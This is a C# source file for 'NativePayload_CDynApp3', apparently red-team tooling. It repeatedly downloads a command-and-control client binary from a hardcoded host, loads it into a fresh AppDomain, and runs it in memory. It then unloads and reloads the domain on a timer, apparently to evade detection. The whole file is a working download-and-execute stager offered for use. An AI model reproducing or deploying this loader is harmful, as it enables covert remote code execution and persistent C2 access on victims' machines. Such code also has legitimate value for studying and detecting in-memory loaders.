using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace NativePayload_CDynApp3
{
  [Serializable]
    public class Program 
    {
        
        static void Main(string[] args)
        {             
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_CDynApp3 , Published by Damon Mohammadbagher , Jun 2024");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_CDynApp3 loading C2 Client-Side files via New Dynamic AppDomains");
            Console.WriteLine();
            
            int c = 1;
            while (true)
            {
                AppDomain __AppDomain = AppDomain.CreateDomain("test" + c++.ToString());
                System.Threading.Thread.Sleep(2000);
                new Task(() =>
                {
                    __AppDomain.DoCallBack(new CrossAppDomainDelegate(() =>
                    {
                        string Source_Exe = "SIC2_Client.exe";
                        //byte[] Source_Exe_Bytes = System.IO.File.ReadAllBytes(Source_Exe);
                        string serverUrl = "http://192.168.56.101:8000/SIC2_Client.bin";
                        byte[] Source_Exe_Bytes = new WebClient().DownloadData(serverUrl);
                        string NameSpaceProgram = "SIC2_Client.Program";
                        string Target_or_MainMethodName = "_Runinmem";
                        Assembly _Asmx = Assembly.Load(Source_Exe_Bytes);
                        Type Root_NameSpace_Program = _Asmx.GetType(NameSpaceProgram);
                        object Inst = Activator.CreateInstance(Root_NameSpace_Program);
                        object o = null;
                        object[] ps = new object[] { o };
                        MethodInfo _DynamicMethod = Root_NameSpace_Program.GetMethod(Target_or_MainMethodName);
                        string CmdObjOutput = Convert.ToString(_DynamicMethod.Invoke(Inst, ps));
                        Console.WriteLine();
                        Console.WriteLine("Done.");
                    }));
                }).Start();

                Console.WriteLine("delay 30ec");

                var _Delay = Task.Delay(TimeSpan.FromSeconds(60));
                do { System.Threading.Thread.Sleep(20); } while (!_Delay.IsCompleted);
                AppDomain.Unload(__AppDomain);
                Console.WriteLine("Unload Appdomain test" + c.ToString());
                _Delay = Task.Delay(TimeSpan.FromSeconds(20));
                Console.WriteLine("Appdomain testX for 20sec will not Load in-memory...");
                do { System.Threading.Thread.Sleep(20); } while (!_Delay.IsCompleted);
                Console.WriteLine("reloading new Appdomain test" + (1 + c).ToString());
                
            }

        }
   
    }
}
